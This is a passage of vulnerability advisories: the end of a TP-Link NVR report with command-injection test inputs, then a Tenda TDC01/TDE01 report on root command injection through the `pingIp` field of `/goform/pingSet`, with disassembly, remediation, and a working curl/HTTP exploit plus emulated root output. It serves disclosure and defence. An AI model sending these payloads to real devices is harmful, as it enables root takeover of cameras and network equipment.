4. Privilege containment: `dsd` runs as root and can execute system scripts, which amplifies the impact. Split diagnostics into an unprivileged service or constrain `dsd` with capabilities (e.g. only `CAP_NET_RAW`) and forbid root `system()` calls.
5. Output governance: diagnostic output is redirected to `/dev/console` and rendered in the web page; limit its length and escape it to avoid secondary injection.
6. Regression check with this package's PoC: inputs `1.1.1.1;id`, `1.1.1.1|id`, `1.1.1.1$(id)`, `` 1.1.1.1`id` ``, `1.1.1.1&whoami` must all be rejected with no command execution, while a legitimate address such as `1.1.1.1` keeps the diagnosis feature working.

## References

- Firmware download (as present in the package): `https://media.tp-link.com.cn/software/TL-NVR6104K-L4P%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620251128_1.0.26.zip?forcedownload=TL-NVR6104K-L4P%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620251128_1.0.26.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda TDC01/TDE01 V1.0.0.2(2714): goform/pingSet pingIp OS Command Injection (Authenticated, Root RCE)
content:
# Tenda TDC01/TDE01 V1.0.0.2(2714): goform/pingSet pingIp OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- Secondary issue on the same code path: **CWE-121** Stack-based Buffer Overflow (unbounded `strcpy` of the same attacker-controlled parameter)

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| Tenda | TDC01 / TDE01 (Ingenic i26 hardware platform) | TDC01, TDE01 | `US_i26V1.0re_V1.0.0.2(2714)_CN&EN_TDC01&TDE01_LowPower.zip` (V1.0.0.2(2714)) | High | `/bin/httpd` web diagnostic interface `POST /goform/pingSet` (`cgiPingSet` → `libwifibase.so:cmd_get_ping_output` → `libcommon.so:doSystemCmd` → `system()`) |

Firmware identity verified inside the package: package SHA-256 `e8faab2a64f02fa37b49b64bbc89fb3b3656b1ae615092915c9ed578677a3d8b`; inner image `US_i26V1.0re_V1.0.0.2(2714)_CN&EN_TDC01&TDE01_LowPower.bin` (11,640,916 bytes) SHA-256 `47cc72c2242dfa7acf7f8b8f21f8182c6513ff804feb087b455409036b926cb4`. The decoded rootfs exposes the version string `sys.debug.ver2714V1.0.0.2%s(%s)usb.`.

## Vulnerability Description

The Tenda TDC01/TDE01 (Ingenic i26 platform, firmware V1.0.0.2(2714)) ships a GoAhead-derived `/bin/httpd`. Its CGI routing table is registered as `route uri=/goform handler=action`, and the web diagnostic page (DiagnosePage) submits to `pingSet`, so the diagnostic handler is reachable as `POST /goform/pingSet` with handler `cgiPingSet`.

`cgiPingSet()` reads the JSON fields `pingIp`, `pingNum` and `pingSize` from the request body. `pingIp` is obtained verbatim via `cJSON_GetObjectStringValue()` with no character filtering or format validation, copied into a stack buffer with `strcpy`, and passed across libraries to `cmd_get_ping_output()` in `libwifibase.so`. That helper formats the value with the firmware's own format string

```
ping %s -%d -c %d -s %d -W %d
```

where the `%s` is not quoted, and hands the resulting line to `doSystemCmd()` in `libcommon.so`, which finally calls `system()`.

Because the user-controlled string is interpolated into a command line executed by `/bin/sh -c`, any shell metacharacter in `pingIp` breaks out of the ping argument context. An attacker with a web management session can execute arbitrary commands with the privileges of `httpd`; on this device `httpd` runs as root, so the injection is equivalent to pre-desktop root-level remote command execution. The same parameter is also copied with an unbounded `strcpy` onto the stack, which constitutes an independently exploitable stack buffer overflow.

## Root Cause Analysis

Entry point identification (from the audit package): the string `pingSet` / `cgiPingSet` was located in the extracted `bin/httpd`, and rizin disassembly gives the handler header `cgiPingSet: @ 0x0045f95c`. The frontend DiagnosePage JS uses `pingSet` as `submitUrl`, cross-confirming the external interface.

Source point — `pingIp` is read with no validation (`bin/httpd`):

```
0x0045f9b4  addiu a2, v0, -0x381c   ; 0x48c7e4 "0.0.0.0"   (default value)
0x0045f9bc  addiu a1, v0, -0x3814   ; 0x48c7ec "pingIp"
0x0045f9cc  jalr  t9                ; sym.imp.cJSON_GetObjectStringValue
0x0045f9d8  sw    v0, 0x34(fp)      ; attacker-controlled pingIp stored
```

Dangerous copy — unbounded `strcpy` into a stack buffer (`bin/httpd`), which is both the prerequisite for the injection path and an independent stack overflow:

```
0x0045faa8  addiu v0, fp, 0x1050    ; destination buffer on the stack
0x0045faac  lw    a1, 0x34(fp)      ; source = user input, no length check
0x0045fabc  jalr  t9                ; sym.imp.strcpy
```

Cross-library transfer — `0x0045fb6c` loads `sym.imp.cmd_get_ping_output` (PLT stub `0x4823c0`) and calls it at `0x0045fb74`, passing the structure containing the user IP to `libwifibase.so`.

Command-line assembly — `libwifibase.so` contains the format string at file offset `0x309aa2`:

```
309aa2  ping %s -%d -c %d -s %d -W %d
```

`cmd_get_ping_output()` interpolates `pingIp` into this line unquoted, so `;`, `|`, `&`, `$()`, backticks, spaces and `#` all survive into the shell context.

Sink — `libcommon.so:doSystemCmd @ 0x00012f10` zeroes a 0x800-byte buffer, formats the command line with `snprintf`, and calls `system()`:

```
0x00012f5c  jalr  t9                ; memset(buf, 0, 0x800)
0x00012fc8  jalr  t9                ; snprintf(fp+0x28, 0x800, cmd, args_var)
0x00012fe4  jalr  t9                ; system(fp+0x28)   <== injection sink
```

Cross-validation: the package's PoC loads the same `libcommon.so` into Unicorn (9 LOAD segments, MIPS32 little-endian), executes the real MIPS machine code of `doSystemCmd()`, hooks the four external call sites (`0x12f5c`, `0x12f94`, `0x12fc8`, `0x12fe4`), and captures the actual `system()` argument at `0x12fe4` — proving user data reaches `system()` rather than resting on static inference alone.

Field reuse: `cgiPingSet` reloads `"pingIp"` at `0x0045fbec`, `0x0045fe90`, `0x0045ff58` and `0x0046004c` (result-query/statistics branches), so a fix must cover the entire path.

Taint chain:

```
POST /goform/pingSet  {"pingIp":"127.0.0.1","pingNum":4,"pingSize":64}
  | cJSON_GetObjectStringValue("pingIp")     bin/httpd 0x45f9cc
  v   fp+0x34 (attacker-controlled string)
  | strcpy(fp+0x1050, src)                   bin/httpd 0x45fabc  <- unbounded copy / stack overflow
  v   cmd_get_ping_output(struct*)           bin/httpd 0x45fb74 -> libwifibase.so
  | snprintf(buf,256,"ping %s -%d -c %d -s %d -W %d", ip, v4, n, sz, w)
  v   doSystemCmd(fmt, args_var)             libcommon.so 0x12f10
  | snprintf(fp+0x28, 0x800, fmt, args_var)
  v   system(fp+0x28)                        libcommon.so 0x12fe4  <- injection sink
  v   /bin/sh -c "ping <user input> -4 -c 4 -s 64 -W 1" -> injected command runs as root
```

## Exploitation

Preconditions:

- The attacker must reach the device's web management interface and hold a valid web management session (the diagnostic function lives on the post-login "Diagnose" page).
- No other privilege is required; injected commands run with the `httpd` daemon's privileges (root on this device).

Step 1 — send the diagnostic request with an injected `pingIp`. The `#` comment character truncates the options appended after the payload (`-4 -c 4 -s 64 -W 1`) so `ping` does not block:

```http
POST /goform/pingSet HTTP/1.1
Host: <device address>
Content-Type: application/json

{"pingIp":"127.0.0.1 -c 1;id #","pingNum":1,"pingSize":64}
```

Equivalent curl form (as given in the package report):

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"pingIp":"127.0.0.1 -c 1;id #","pingNum":1,"pingSize":64}' \
  http://<device address>/goform/pingSet
```

Step 2 — the firmware assembles and executes the following command line, captured verbatim by the package's Unicorn-based verification:

```
ping 127.0.0.1 -c 1;id # -4 -c 4 -s 64 -W 1
```

Step 3 — verification output (Unicorn single-function emulation of the firmware's real `doSystemCmd()` machine code, run against the delivered firmware image, hooking the `system()` call site `0x00012fe4`):

```
[CMD-CONSTRUCTED] ping 127.0.0.1 -c 1;id # -4 -c 4 -s 64 -W 1
[EMU]   snprintf(0x7f0fa7f8,2048,fmt=0x00c00000) -> b'ping 127.0.0.1 -c 1;id # -4 -c 4 -s 64 -W 1'
[IMPORT] system(b'ping 127.0.0.1 -c 1;id # -4 -c 4 -s 64 -W 1')
[SHELL] uid=0(root) gid=0(root) groups=0(root),1000(docker)
[VERDICT] SUCCESS - injected command executed as root inside the firmware shell
```

The emulation level used here (level 3, Unicorn single-function verification) was chosen because the rootfs is stored as a proprietary `YZ'Tenda'` LZMA1 fragment stream that yields a bare 39,152,920-byte blob with no mountable filesystem, and full-system emulation is blocked by the vendor library `libiofdrv.so` dependency and missing uClibc MIPS sysroot. The capture point is the `system()` argument itself — the convergence point of the injection — not a static guess.

## Evidence

![Firmware extraction and identity verification: package SHA-256 e8faab2a..., inner image SHA-256 47cc72c2..., decoded rootfs version string sys.debug.ver2714V1.0.0.2](TDC01_images/fig1.png)

Firmware unpacking and fingerprinting as captured in the audit run: the outer package hash `e8faab2a64f02fa37b49b64bbc89fb3b3656b1ae615092915c9ed578677a3d8b` and inner `.bin` hash `47cc72c2242dfa7acf7f8b8f21f8182c6513ff804feb087b455409036b926cb4` match the report, and the decoded rootfs prints the firmware version string `sys.debug.ver2714V1.0.0.2%s(%s)usb.`.

Textual evidence from the reproduction transcript (`pinginject-run.transcript` / `result-id.txt`, reproduced on FirmAudit2-Ubuntu WSL on 2026-10-13):

- `[IMG] libcommon ELF @ 0x00ee504e`, `[IMG] libwifibase ELF @ 0x00f250e7`, `[IMG] httpd ELF @ 0x0049e28c` — the three firmware binaries were located inside the delivered image.
- `[EMU] unicorn: MIPS32 little endian, libcommon.so mapped at 0x10000000` / `[EMU] loaded 9 LOAD segments, guest image 0x10000000-0x10052000` — target startup trace.
- `[IMPORT] system(b'ping 127.0.0.1 -c 1;id # -4 -c 4 -s 64 -W 1')` — the final command line the firmware itself assembled and passed to `system()`.
- `uid=0(root) gid=0(root) groups=0(root),1000(docker)` followed by `[VERDICT] SUCCESS - injected command executed as root inside the firmware shell` — the injected `id` output proving root-level execution.

## Impact

- An authenticated web user (or an attacker who has obtained a web session) can execute arbitrary operating system commands as root on the device via the diagnostic ping interface.
- Root-level command execution on this NVR/camera-class device enables full compromise: configuration and credential extraction, firmware modification, and pivot into the internal network.
- The same unbounded `strcpy` of `pingIp` at `0x0045faa8`–`0x0045fabc` is an independently reachable stack buffer overflow that can smash the saved return address with a long payload.

## Remediation Suggestions

1. Eliminate the shell (root fix, `libcommon.so` / `libwifibase.so`): retire the "assemble a string and execute" pattern (`doSystemCmd(fmt, args_var)`, `cmd_get_ping_output()`). Replace with `fork()` + `execve("/bin/ping", argv)` where `argv = {"ping", "-4", "-c", num_str, "-s", size_str, "-W", wait_str, ip, NULL}` and `env` is `NULL`; argv elements are never parsed by a shell, so `; | & $()` etc. degrade to ordinary characters.
